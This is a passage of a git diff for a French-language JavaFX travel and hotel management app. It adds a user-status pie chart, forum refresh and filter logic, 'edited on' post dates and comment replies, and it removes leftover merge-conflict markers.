+        bloquer_label.setTextFill(Color.web("#E78D1E"));
+        nonBloquer_label.setTextFill(Color.web("#132a3e"));
+
+        bloquer_label.setStyle("-fx-font-size: 14px; -fx-font-weight: bold;");
+        nonBloquer_label.setStyle("-fx-font-size: 14px; -fx-font-weight: bold;");
+
+        ObservableList<PieChart.Data> pieChartData = FXCollections.observableArrayList(
+                new PieChart.Data("Bloqués", blockedUsers),
+                new PieChart.Data("Non Bloqués", notBlockedUsers)
+        );
+        ChatStatus.setData(pieChartData);
+
+        for (PieChart.Data data : pieChartData) {
+            double percentage = (data.getPieValue() / totalUsers) * 100;
+            data.setName(data.getName() + " (" + String.format("%.1f", percentage) + "%)");
+
+            if (data.getName().startsWith("Bloqués")) {
+                data.getNode().setStyle("-fx-pie-color: #E78D1E;");
+            } else if (data.getName().startsWith("Non Bloqués")) {
+                data.getNode().setStyle("-fx-pie-color:#132a3e;");
+            }
+
+            data.getNode().setStyle(data.getNode().getStyle() + "-fx-border-color: #FFFFFF; -fx-border-width: 2;");
+
+            Tooltip tooltip = new Tooltip(data.getName());
+            Tooltip.install(data.getNode(), tooltip);
+
+            data.getNode().setOnMouseEntered(event -> {
+                data.getNode().setStyle(data.getNode().getStyle() + "-fx-effect: dropshadow(gaussian, #000000, 10, 0, 0, 0);");
+                tooltip.show(data.getNode(), event.getScreenX(), event.getScreenY());
+            });
+
+            data.getNode().setOnMouseExited(event -> {
+                data.getNode().setStyle(data.getNode().getStyle().replace("-fx-effect: dropshadow(gaussian, #000000, 10, 0, 0, 0);", ""));
+                tooltip.hide();
+            });
+
+            if (data.getName().startsWith("Bloqués")) {
+                data.getNode().setTranslateX(10);
+                data.getNode().setTranslateY(5);
+            }
+
+            RotateTransition rotateTransition = new RotateTransition(Duration.seconds(2), data.getNode());
+            rotateTransition.setByAngle(360);
+            rotateTransition.setCycleCount(1);
+            rotateTransition.setAutoReverse(false);
+            rotateTransition.play();
+        }
+
+    }
+
+
+    //ENDNEWWWWWWWWWWWW
+
+
     private void setCircularImage(String imagePath) {
         Image image = new Image(imagePath);
          photo_profile_signin.setImage(image);
@@ -2543,7 +2607,9 @@ private TableView<Vol> tableViewVols;
         } else {
             Client newClient = new Client(nomField.getText(), prenomField.getText(), email, hashedPassword, Integer.parseInt(number), 2, 0,  photo_profile_signin.getImage().getUrl());
             C1.ajouterUser(newClient);
+            //NEWW
             EmailService.sendWelcomeEmail(email);
+            //
             showAlert("Confirmation", "Votre compte a été créé", Alert.AlertType.INFORMATION);
             switchToSignIn();
             RefreshTableView_User();
@@ -2648,6 +2714,7 @@ private TableView<Vol> tableViewVols;
             labal_tel.setText(String.valueOf(client.getNum_tel()).toUpperCase());
             label_mail.setText(client.getEmail());
             label_nom.setText(client.getName().toUpperCase());
+            CurrentUser = new Client(client.getId(), client.getName(), client.getPrenom(), client.getEmail(), client.getPassword(), client.getNum_tel(), client.getRole(), client.getStatus(), client.getPhoto_profile());
         } catch (Exception e) {
             showAlert("Erreur", "Une erreur est survenue lors de la vérification de l'utilisateur.", Alert.AlertType.ERROR);
             e.printStackTrace();
@@ -2736,6 +2803,7 @@ private TableView<Vol> tableViewVols;
     @FXML
     private void changeForum(javafx.event.ActionEvent actionEvent) {
         if (actionEvent.getSource() == bt_menu_dashboard) {
+            refreshData();
             page_chambre.setVisible(false);
             page_hotel.setVisible(false);
             page_forum.setVisible(false);
@@ -3103,6 +3171,8 @@ private TableView<Vol> tableViewVols;
             page_utilisateur.setVisible(false);
             page_dashboard.setVisible(true);
         }
+        createdByField.setText(CurrentUser.getEmail());
+
     }
     @FXML
     private void AddHotel(ActionEvent event) throws IOException {
@@ -3221,8 +3291,7 @@ private TableView<Vol> tableViewVols;
 
                 TableView_Hotel.setItems(HotelData);
                 TableView_Hotel.refresh(); // Force update
-                page_hotel_chercher.setText(null);
-                page_hotel_combo_chercher.getSelectionModel().clearSelection();
+
             } else {
                 showAlert("Information", "Aucun hôtel trouvé.", Alert.AlertType.INFORMATION);
             }
@@ -4344,9 +4413,6 @@ private TableView<Vol> tableViewVols;
 
 
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
     /**********************************NEWWWWWWWW******************************************/
 
     @FXML
@@ -4546,18 +4612,95 @@ private TableView<Vol> tableViewVols;
         timeline.setCycleCount(Timeline.INDEFINITE);
 
         timeline.play();
-=======
+    }
+
+
+
 
 //--------------------------------NajdForumF------------------------------------------------------------------------
 
-=======
 
-//--------------------------------NajdForumF------------------------------------------------------------------------
->>>>>>> Stashed changes
-=======
+    //
 
-//--------------------------------NajdForumF------------------------------------------------------------------------
->>>>>>> Stashed changes
+    private void refreshTableFB() {
+        forumList.clear();
+        forumList.addAll(forumService.rechercher());
+        forumTableView.setItems(forumList);
+    }
+
+    private void refreshTableFB(String query) {
+        forumList.clear();
+        List<Forum> allForums = forumService.rechercher();
+
+        if (query == null || query.trim().isEmpty()) {
+            forumList.addAll(allForums);
+        } else {
+
+            List<Forum> filteredList = allForums.stream()
+                    .filter(f -> f.getName().toLowerCase().contains(query.toLowerCase()) ||
+                            f.getDescription().toLowerCase().contains(query.toLowerCase()))
+                    .toList();
+
+            forumList.addAll(filteredList);
+        }
+
+        forumTableView.setItems(forumList);
+    }
+
+    @FXML
+    private void clearFieldsFP() {
+
+        nameField.clear();
+        createdByField.clear();
+        descriptionField.clear();
+        memberEmailField.clear();
+
+        nameErrorLabel.setText("");
+        emailErrorLabel.setText("");
+        descriptionErrorLabel.setText("");
+        memberEmailErrorLabel.setText("");
+
+        membersListView.getItems().clear();
+
+        isPrivateCheckBox.setSelected(false);
+
+        isNameValid = false;
+        isEmailValid = false;
+        isDescriptionValid = false;
+    }
+
+    private void refreshForums() {
+        try {
+
+            List<Forum> forums = forumServiceFP.rechercher();
+
+            forumComboBox.getItems().clear();
+
+            forumComboBox.getItems().addAll(forums);
+
+            if (!forums.isEmpty()) {
+                forumComboBox.getSelectionModel().select(0);
+            }
+
+            updateForumInfo();
+
+            forumComboBox.setConverter(new StringConverter<Forum>() {
+                @Override
+                public String toString(Forum forum) {
+                    return forum != null ? forum.getName() : "";
+                }
+
+                @Override
+                public Forum fromString(String string) {
+                    return null;
+                }
+            });
+        } catch (Exception e) {
+
+            showAlertFP("Error", "Failed to refresh forums: " + e.getMessage(), Alert.AlertType.ERROR);
+        }
+    }
+
     @FXML
     private void handlePrivateCheckbox() {
         boolean isPrivate = isPrivateCheckBox.isSelected();
@@ -4624,12 +4767,7 @@ private TableView<Vol> tableViewVols;
     private void handleDelete(Forum forum) {
         forumService.supprimer(forum);
         refreshTableFB();
-    }
-
-    private void refreshTableFB() {
-        forumList.clear();
-        forumList.addAll(forumService.rechercher());
-        forumTableView.setItems(forumList);
+        refreshForums();
     }
 
     private void onNameEdit(TableColumn.CellEditEvent<Forum, String> event) {
@@ -4657,6 +4795,7 @@ private TableView<Vol> tableViewVols;
     private void updateForum(Forum forum) {
         forumService.modifier(forum);
         refreshTableFB();
+        refreshForums();
     }
 
     private void validateName(String name) {
@@ -4737,30 +4876,6 @@ private TableView<Vol> tableViewVols;
     }
 
     @FXML
-<<<<<<< Updated upstream
-=======
-    private void clearFieldsFP() {
-
-        nameField.clear();
-        createdByField.clear();
-        descriptionField.clear();
-        memberEmailField.clear();
-
-        nameErrorLabel.setText("");
-        emailErrorLabel.setText("");
-        descriptionErrorLabel.setText("");
-        memberEmailErrorLabel.setText("");
-
-        membersListView.getItems().clear();
-
-        isPrivateCheckBox.setSelected(false);
-
-        isNameValid = false;
-        isEmailValid = false;
-        isDescriptionValid = false;
-    }
-    @FXML
->>>>>>> Stashed changes
     private void addForum() {
         validateName(nameField.getText());
         validateEmail(createdByField.getText());
@@ -4799,20 +4914,16 @@ private TableView<Vol> tableViewVols;
         forum.setNbrMembers(membersListView.getItems().size());
 
         forumService.ajouter(forum);
-<<<<<<< Updated upstream
-        refreshTableFB();
-=======
 
         refreshTableFB();
         clearFieldsFP();
-        refreshPosts2();
-        
+        refreshForums();
+
         Alert successAlert = new Alert(Alert.AlertType.INFORMATION);
         successAlert.setTitle("Succès");
         successAlert.setHeaderText("Forum ajouté avec succès");
         successAlert.setContentText("Le forum a été ajouté à la base de données.");
         successAlert.showAndWait();
->>>>>>> Stashed changes
     }
 
     private boolean validateTableEdit(Forum forum, String field, String newValue) {
@@ -4885,28 +4996,24 @@ private TableView<Vol> tableViewVols;
         }
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    //***************************************
-
-=======
 //***************************************
->>>>>>> Stashed changes
-=======
-//***************************************
->>>>>>> Stashed changes
+private void handlePostTypeChange() {
+    String selectedType = postTypeComboBox.getValue();
+    announcementFields.setVisible("Announcement".equals(selectedType));
+    surveyFields.setVisible("Survey".equals(selectedType));
 
-    private void handlePostTypeChange() {
-        String selectedType = postTypeComboBox.getValue();
-        announcementFields.setVisible("Announcement".equals(selectedType));
-        surveyFields.setVisible("Survey".equals(selectedType));
+    if ("Announcement".equals(selectedType)) {
+        clearSurveyFields();
+        announcementUserField.setText(CurrentUser.getEmail());
 
-        if ("Announcement".equals(selectedType)) {
-            clearSurveyFields();
-        } else {
-            clearAnnouncementFields();
-        }
+    } else {
+        clearAnnouncementFields();
+        surveyUserField.setText(CurrentUser.getEmail());
+        surveyAuthorField.setText(CurrentUser.getEmail());
+
     }
+
+}
 
     private void loadForums() {
         List<Forum> forums = forumServiceFP.rechercher();
@@ -4975,31 +5082,6 @@ private TableView<Vol> tableViewVols;
                 validateComment(newValue));
     }
 
-<<<<<<< Updated upstream
-=======
-    private void refreshPosts2() {
-        // Clear the current posts in the VBox
-        postsVBox.getChildren().clear();
-
-        // Get the currently selected forum
-        Forum selectedForum = forumComboBox.getValue();
-
-        if (selectedForum != null) {
-            // Fetch posts from the database that belong to the selected forum
-            List<Post> posts = postService.rechercher().stream()
-                    .filter(p -> p.getForumId() == selectedForum.getForumId())
-                    .filter(p -> (p instanceof Announcement) || (p instanceof Survey))
-                    .toList();
-
-            // Display each post in the VBox
-            for (Post post : posts) {
-                VBox postBox = displayPost(post); // Create a VBox for the post
-                postsVBox.getChildren().add(postBox); // Add the post to the VBox
-            }
-        }
-    }
-
->>>>>>> Stashed changes
     private void refreshPosts() {
         postsVBox.getChildren().clear();
         Forum selectedForum = forumComboBox.getValue();
@@ -5021,57 +5103,19 @@ private TableView<Vol> tableViewVols;
         VBox postBox = new VBox(10);
         postBox.getStyleClass().add("post-box");
         postBox.setStyle("-fx-background-color: rgba(19,42,62,0.8); -fx-background-radius: 10; -fx-padding: 15;");
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        postBox.setAlignment(Pos.CENTER); // Center everything in the postBox
-
-        // Post Title
-=======
         postBox.setAlignment(Pos.CENTER);
 
->>>>>>> Stashed changes
-=======
-        postBox.setAlignment(Pos.CENTER);
-
->>>>>>> Stashed changes
         Label postTitle = new Label();
         postTitle.getStyleClass().add("post-title");
         postTitle.setStyle("-fx-text-fill: white; -fx-font-size: 28px; -fx-font-weight: bold;");
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Post Content
-        Label postContent = new Label();
-        postContent.getStyleClass().add("post-content");
-        postContent.setStyle("-fx-text-fill: white; -fx-font-size: 24px;");
-        postContent.setWrapText(true);
-
-        // Post Tags
         Label postTags = new Label();
         postTags.getStyleClass().add("post-tags");
 
-        // Post Date
-=======
-        Label postTags = new Label();
-        postTags.getStyleClass().add("post-tags");
-
->>>>>>> Stashed changes
-=======
-        Label postTags = new Label();
-        postTags.getStyleClass().add("post-tags");
-
->>>>>>> Stashed changes
         Label postDate = new Label();
         postDate.getStyleClass().add("post-metadata");
         postDate.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 22px;");
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Voting Section
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         HBox voteBox = new HBox(5);
         voteBox.getStyleClass().add("vote-box");
         voteBox.setAlignment(Pos.CENTER);
@@ -5102,27 +5146,11 @@ private TableView<Vol> tableViewVols;
 
         voteBox.getChildren().addAll(upVoteBtn, voteCount, downVoteBtn);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // View Comments Button
-        Button viewCommentsButton = new Button("Voir les Commentaires");
-=======
         Button viewCommentsButton = new Button("Voir Plus des détails");
->>>>>>> Stashed changes
-=======
-        Button viewCommentsButton = new Button("Voir Plus des détails");
->>>>>>> Stashed changes
         viewCommentsButton.getStyleClass().add("view-comments-button");
         viewCommentsButton.setStyle("-fx-font-size: 19px; -fx-background-color: rgba(42,131,45,0.6); -fx-text-fill: white; -fx-background-radius: 5;");
         viewCommentsButton.setOnAction(e -> showComments(post));
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Edit and Delete Buttons (Bottom Right Corner)
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         HBox bottomRightControls = new HBox(10);
         bottomRightControls.setAlignment(Pos.BOTTOM_RIGHT);
 
@@ -5146,13 +5174,6 @@ private TableView<Vol> tableViewVols;
 
         bottomRightControls.getChildren().addAll(editPostButton, deletePostButton);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Image Section
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         ImageView imageView = null;
         if (post.getCheminFichier() != null && !post.getCheminFichier().isEmpty()) {
             try {
@@ -5166,35 +5187,18 @@ private TableView<Vol> tableViewVols;
             }
         }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Post Content Section
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         VBox centerContent = new VBox(10);
         centerContent.setAlignment(Pos.CENTER);
 
         if (post instanceof Announcement announcement) {
             postTitle.setText(announcement.getAnnouncementTitle());
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            postContent.setText(announcement.getAnnouncementContent());
 
-            // Format tags as "Tags : #test #tags #fun"
-=======
-
->>>>>>> Stashed changes
-=======
-
->>>>>>> Stashed changes
             String tags = announcement.getAnnouncementTags();
             if (tags != null && !tags.isEmpty()) {
                 String[] tagArray = tags.replace(",", " ").split(" ");
                 StringBuilder formattedTags = new StringBuilder("Tags : ");
                 for (String tag : tagArray) {
-                    if (!tag.isEmpty()) { // Skip empty strings
+                    if (!tag.isEmpty()) {
                         if (!tag.startsWith("#")) {
                             formattedTags.append("#").append(tag).append(" ");
                         } else {
@@ -5202,51 +5206,35 @@ private TableView<Vol> tableViewVols;
                         }
                     }
                 }
-                postTags.setText(formattedTags.toString().trim()); // Remove trailing space
+                postTags.setText(formattedTags.toString().trim());
             } else {
-                postTags.setText("Tags : "); // No tags
+                postTags.setText("Tags : ");
             }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Style tags with color #e78d1e and bold
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
             postTags.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
 
-            postDate.setText("Posté le : " + formatDateTime(post.getDateCreation()));
-
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Add image, title, and content to centerContent
-            if (imageView != null) {
-                centerContent.getChildren().add(imageView);
+            String dateText;
+            if (post.getDateModification() != null && !post.getDateModification().equals(post.getDateCreation())) {
+                dateText = "Edité le : " + formatDateTime(post.getDateModification());
+            } else {
+                dateText = "Posté le : " + formatDateTime(post.getDateCreation());
             }
-            centerContent.getChildren().addAll(postTitle, postContent);
-=======
-=======
->>>>>>> Stashed changes
+            postDate.setText(dateText);
+
             if (imageView != null) {
                 centerContent.getChildren().add(imageView);
             }
             centerContent.getChildren().addAll(postTitle);
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
 
         } else if (post instanceof Survey survey) {
             postTitle.setText(survey.getSurveyQuestion());
 
-            // Format tags as "Tags : #test #tags #fun"
             String tags = survey.getSurveyTags();
             if (tags != null && !tags.isEmpty()) {
                 String[] tagArray = tags.replace(",", " ").split(" ");
                 StringBuilder formattedTags = new StringBuilder("Tags : ");
                 for (String tag : tagArray) {
-                    if (!tag.isEmpty()) { // Skip empty strings
+                    if (!tag.isEmpty()) {
                         if (!tag.startsWith("#")) {
                             formattedTags.append("#").append(tag).append(" ");
                         } else {
@@ -5254,43 +5242,28 @@ private TableView<Vol> tableViewVols;
                         }
                     }
                 }
-                postTags.setText(formattedTags.toString().trim()); // Remove trailing space
+                postTags.setText(formattedTags.toString().trim());
             } else {
-                postTags.setText("Tags : "); // No tags
+                postTags.setText("Tags : ");
             }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Style tags with color #e78d1e and bold
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
             postTags.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
 
-            postDate.setText("Posté le : " + formatDateTime(post.getDateCreation()));
+            String dateText;
+            if (post.getDateModification() != null && !post.getDateModification().equals(post.getDateCreation())) {
+                dateText = "Edité le : " + formatDateTime(post.getDateModification());
+            } else {
+                dateText = "Posté le : " + formatDateTime(post.getDateCreation());
+            }
+            postDate.setText(dateText);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Add image and title to centerContent
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
             if (imageView != null) {
                 centerContent.getChildren().add(imageView);
             }
             centerContent.getChildren().add(postTitle);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Survey Choices
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
             VBox choicesBox = new VBox(5);
-            choicesBox.setAlignment(Pos.CENTER); // Center the survey choices
+            choicesBox.setAlignment(Pos.CENTER);
 
             List<Choix> choices = choixService.rechercher().stream()
                     .filter(c -> c.getPostId() == survey.getPostId())
@@ -5317,21 +5290,6 @@ private TableView<Vol> tableViewVols;
                 choicesBox.getChildren().add(choiceBox);
             }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Add survey choices to centerContent
-            centerContent.getChildren().add(choicesBox);
-        }
-
-        // Left Content (View Comments, Tags, Posted On)
-        VBox leftContent = new VBox(10);
-        leftContent.setAlignment(Pos.CENTER_LEFT);
-        leftContent.getChildren().addAll(viewCommentsButton, postTags, postDate);
-
-        // Add all sections to the postBox
-=======
-=======
->>>>>>> Stashed changes
             centerContent.getChildren().add(choicesBox);
         }
 
@@ -5339,10 +5297,6 @@ private TableView<Vol> tableViewVols;
         leftContent.setAlignment(Pos.CENTER_LEFT);
         leftContent.getChildren().addAll(postTags, postDate, viewCommentsButton);
 
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         postBox.getChildren().addAll(centerContent, leftContent, voteBox, bottomRightControls);
 
         return postBox;
@@ -5351,19 +5305,11 @@ private TableView<Vol> tableViewVols;
     private void showPostDetails(Post post) {
         postDetailsBox.getChildren().clear();
         postDetailsBox.setStyle("-fx-background-color: rgba(19,42,62,0.8); -fx-background-radius: 10; -fx-padding: 15;");
-        postDetailsBox.setAlignment(Pos.CENTER); // Center everything in the postDetailsBox
+        postDetailsBox.setAlignment(Pos.CENTER);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Post Title
-=======
-=======
->>>>>>> Stashed changes
-        // User Image and Name
         HBox userInfoBox = new HBox(10);
         userInfoBox.setAlignment(Pos.CENTER_LEFT);
 
-        // Load user image
         ImageView userImageView = new ImageView();
         userImageView.setFitWidth(40);
         userImageView.setFitHeight(40);
@@ -5382,54 +5328,22 @@ private TableView<Vol> tableViewVols;
 
         userInfoBox.getChildren().addAll(userImageView, userNameLabel);
 
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         Label titleLabel = new Label();
         titleLabel.getStyleClass().add("post-title");
         titleLabel.setStyle("-fx-text-fill: white; -fx-font-size: 28px; -fx-font-weight: bold;");
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Post Content
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-        Label contentLabel = new Label(); // Use Label instead of Text for better styling
+        Label contentLabel = new Label();
         contentLabel.getStyleClass().add("post-content");
         contentLabel.setStyle("-fx-text-fill: white; -fx-font-size: 24px;");
-        contentLabel.setWrapText(true); // Wrap text to fit the width
+        contentLabel.setWrapText(true);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Post Tags
         Label tagsLabel = new Label();
         tagsLabel.getStyleClass().add("post-tags");
 
-        // Post Date
-=======
-        Label tagsLabel = new Label();
-        tagsLabel.getStyleClass().add("post-tags");
-
->>>>>>> Stashed changes
-=======
-        Label tagsLabel = new Label();
-        tagsLabel.getStyleClass().add("post-tags");
-
->>>>>>> Stashed changes
         Label postDate = new Label();
         postDate.getStyleClass().add("post-metadata");
         postDate.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 22px;");
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Voting Section
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         HBox votingBox = new HBox(5);
         votingBox.getStyleClass().add("vote-box");
         votingBox.setAlignment(Pos.CENTER);
@@ -5451,19 +5365,6 @@ private TableView<Vol> tableViewVols;
 
         votingBox.getChildren().addAll(upVoteBtn, voteCount, downVoteBtn);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // View Comments Button
-        Button viewCommentsButton = new Button("Voir les Commentaires");
-        viewCommentsButton.getStyleClass().add("view-comments-button");
-        viewCommentsButton.setStyle("-fx-font-size: 19px; -fx-background-color: rgba(42,131,45,0.6); -fx-text-fill: white; -fx-background-radius: 5;");
-        viewCommentsButton.setOnAction(e -> showComments(post));
-
-        // Edit and Delete Buttons (Bottom Right Corner)
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         HBox bottomRightControls = new HBox(10);
         bottomRightControls.setAlignment(Pos.BOTTOM_RIGHT);
 
@@ -5480,13 +5381,6 @@ private TableView<Vol> tableViewVols;
 
         bottomRightControls.getChildren().addAll(editBtn, deleteBtn);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Image Section
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         ImageView imageView = null;
         if (post.getCheminFichier() != null && !post.getCheminFichier().isEmpty()) {
             try {
@@ -5500,33 +5394,19 @@ private TableView<Vol> tableViewVols;
             }
         }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-        // Post Content Section
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
         VBox centerContent = new VBox(10);
         centerContent.setAlignment(Pos.CENTER);
 
         if (post instanceof Announcement announcement) {
             titleLabel.setText(announcement.getAnnouncementTitle());
-            contentLabel.setText(announcement.getAnnouncementContent()); // Use Label for content
+            contentLabel.setText(announcement.getAnnouncementContent());
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Format tags as "Tags : #test #tags #fun"
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
             String tags = announcement.getAnnouncementTags();
             if (tags != null && !tags.isEmpty()) {
                 String[] tagArray = tags.replace(",", " ").split(" ");
                 StringBuilder formattedTags = new StringBuilder("Tags : ");
                 for (String tag : tagArray) {
-                    if (!tag.isEmpty()) { // Skip empty strings
+                    if (!tag.isEmpty()) {
                         if (!tag.startsWith("#")) {
                             formattedTags.append("#").append(tag).append(" ");
                         } else {
@@ -5534,29 +5414,21 @@ private TableView<Vol> tableViewVols;
                         }
                     }
                 }
-                tagsLabel.setText(formattedTags.toString().trim()); // Remove trailing space
+                tagsLabel.setText(formattedTags.toString().trim());
             } else {
-                tagsLabel.setText("Tags : "); // No tags
+                tagsLabel.setText("Tags : ");
             }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Style tags with color #e78d1e and bold
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
             tagsLabel.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
 
-            postDate.setText("Posté le : " + formatDateTime(post.getDateCreation()));
+            String dateText;
+            if (post.getDateModification() != null && !post.getDateModification().equals(post.getDateCreation())) {
+                dateText = "Edité le : " + formatDateTime(post.getDateModification());
+            } else {
+                dateText = "Posté le : " + formatDateTime(post.getDateCreation());
+            }
+            postDate.setText(dateText);
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Add image, title, and content to centerContent
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
             if (imageView != null) {
                 centerContent.getChildren().add(imageView);
             }
@@ -5565,27 +5437,12 @@ private TableView<Vol> tableViewVols;
         } else if (post instanceof Survey survey) {
             titleLabel.setText(survey.getSurveyQuestion());
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Format tags as "Tags : #test #tags #fun"
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
             String tags = survey.getSurveyTags();
             if (tags != null && !tags.isEmpty()) {
                 String[] tagArray = tags.replace(",", " ").split(" ");
                 StringBuilder formattedTags = new StringBuilder("Tags : ");
                 for (String tag : tagArray) {
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-                    if (!tag.isEmpty()) { // Skip empty strings
-=======
                     if (!tag.isEmpty()) {
->>>>>>> Stashed changes
-=======
-                    if (!tag.isEmpty()) {
->>>>>>> Stashed changes
                         if (!tag.startsWith("#")) {
                             formattedTags.append("#").append(tag).append(" ");
                         } else {
@@ -5593,45 +5450,28 @@ private TableView<Vol> tableViewVols;
                         }
                     }
                 }
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-                tagsLabel.setText(formattedTags.toString().trim()); // Remove trailing space
-            } else {
-                tagsLabel.setText("Tags : "); // No tags
-=======
                 tagsLabel.setText(formattedTags.toString().trim());
             } else {
                 tagsLabel.setText("Tags : ");
->>>>>>> Stashed changes
-=======
-                tagsLabel.setText(formattedTags.toString().trim());
-            } else {
-                tagsLabel.setText("Tags : ");
->>>>>>> Stashed changes
             }
 
-            // Style tags with color #e78d1e and bold
             tagsLabel.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
 
-            postDate.setText("Posté le : " + formatDateTime(post.getDateCreation()));
+            String dateText;
+            if (post.getDateModification() != null && !post.getDateModification().equals(post.getDateCreation())) {
+                dateText = "Edité le : " + formatDateTime(post.getDateModification());
+            } else {
+                dateText = "Posté le : " + formatDateTime(post.getDateCreation());
+            }
+            postDate.setText(dateText);
 
-            // Add image and title to centerContent
             if (imageView != null) {
                 centerContent.getChildren().add(imageView);
             }
             centerContent.getChildren().add(titleLabel);
 
-            // Survey Choices
             VBox choicesBox = new VBox(5);
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            choicesBox.setAlignment(Pos.CENTER); // Center the survey choices
-=======
             choicesBox.setAlignment(Pos.CENTER);
->>>>>>> Stashed changes
-=======
-            choicesBox.setAlignment(Pos.CENTER);
->>>>>>> Stashed changes
 
             List<Choix> choices = choixService.rechercher().stream()
                     .filter(c -> c.getPostId() == survey.getPostId())
@@ -5658,24 +5498,6 @@ private TableView<Vol> tableViewVols;
                 choicesBox.getChildren().add(choiceBox);
             }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-            // Add survey choices to centerContent
-            centerContent.getChildren().add(choicesBox);
-        }
-
-        // Left Content (View Comments, Tags, Posted On)
-        VBox leftContent = new VBox(10);
-        leftContent.setAlignment(Pos.CENTER_LEFT);
-        leftContent.getChildren().addAll(viewCommentsButton, tagsLabel, postDate);
-
-        // Add all sections to the postDetailsBox
-        postDetailsBox.getChildren().addAll(centerContent, leftContent, votingBox, bottomRightControls);
-    }
-
-=======
-=======
->>>>>>> Stashed changes
             centerContent.getChildren().add(choicesBox);
         }
 
@@ -5688,11 +5510,6 @@ private TableView<Vol> tableViewVols;
 
         postDetailsBox.getChildren().addAll(mainContent, leftContent, votingBox, bottomRightControls);
     }
-<<<<<<< Updated upstream
-
-//+++++++++++
->>>>>>> Stashed changes
-=======
     //+++++++++++
     private void showComments(Post post) {
         currentPost = post;
@@ -5741,7 +5558,6 @@ private TableView<Vol> tableViewVols;
         editBtn.setOnAction(e -> handleEditComment(comment));
         deleteBtn.setOnAction(e -> handleDeleteComment(comment));
 
-
         HBox userInfoBox = new HBox(10);
         userInfoBox.setAlignment(Pos.TOP_RIGHT);
 
@@ -5776,15 +5592,166 @@ private TableView<Vol> tableViewVols;
         replyBtn.getStyleClass().add("reply-button");
         replyBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #e78d1e; -fx-text-fill: white; -fx-background-radius: 5;");
 
-        buttonsBox.getChildren().addAll(replyBtn,editBtn, deleteBtn);
+        replyBtn.setOnAction(e -> showReplyInput(comment, commentBox));
+
+        buttonsBox.getChildren().addAll(replyBtn, editBtn, deleteBtn);
 
         VBox contentBox = new VBox(5);
         contentBox.setAlignment(Pos.CENTER_LEFT);
-        contentBox.getChildren().addAll(topSection, contentLabel, dateLabel,buttonsBox);
+        contentBox.getChildren().addAll(topSection, contentLabel, dateLabel, buttonsBox);
 
         commentBox.getChildren().add(contentBox);
 
         commentsVBox.getChildren().add(commentBox);
+
+        displayReplies(comment);
+    }
+
+    private void showReplyInput(Comment parentComment, HBox parentCommentBox) {
+
+        TextField replyField = new TextField();
+        replyField.setPromptText("Write your reply...");
+        replyField.setStyle("-fx-font-size: 14px; -fx-background-radius: 5;");
+
+        Button confirmBtn = new Button("Confirm");
